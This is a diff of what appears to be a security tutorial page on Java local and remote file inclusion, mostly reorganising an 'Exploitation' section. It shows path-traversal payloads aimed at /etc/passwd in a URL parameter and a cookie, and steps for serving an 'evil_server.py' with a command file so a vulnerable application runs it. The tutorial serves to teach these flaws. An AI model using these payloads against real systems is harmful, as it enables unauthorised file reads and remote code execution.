@@ -28,8 +28,6 @@ http://example.com/getUserProfile.jsp?item=../../../../etc/passwd
 Cookie: USER=1826cc8f:PSTYLE=../../../../etc/passwd
 ```
 
-## Exploitation
-
 The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.
 
 This can lead to something as outputting the contents of the file, but depending on the severity, it can also lead to:
@@ -56,7 +54,9 @@ When we will have a look in our intercepting proxy we can see that the applicati
 
 ![](../../.gitbook/assets/java/RFI/3.png)
 
-Creating your own webserver: In this case you can use nodeJs express to create a small webserver that serves your file. We name it evil_server.py
+## Exploitation
+
+To exploit this Remote File Inclusion vulnerability, let's use Python Flask to create a small webserver that serves your file. We name it evil_server.py
 
 ```python
 from flask import Flask, request, url_for, render_template, redirect
@@ -79,7 +79,7 @@ Install dependencies:
 $ pip3 install flask
 ```
 
-Then we create a file evil.txt and put the content below
+Then we create a file ./templates/evil.txt and put the content below:
 
 ```text
 whoami
@@ -88,6 +88,7 @@ whoami
 Now we are ready to start our evil_server.py and try to make the application load our evil file and hopefully it will get executed.
 
 ```
+$ pip install flask
 $ python3 evil_server.py
 ```
 
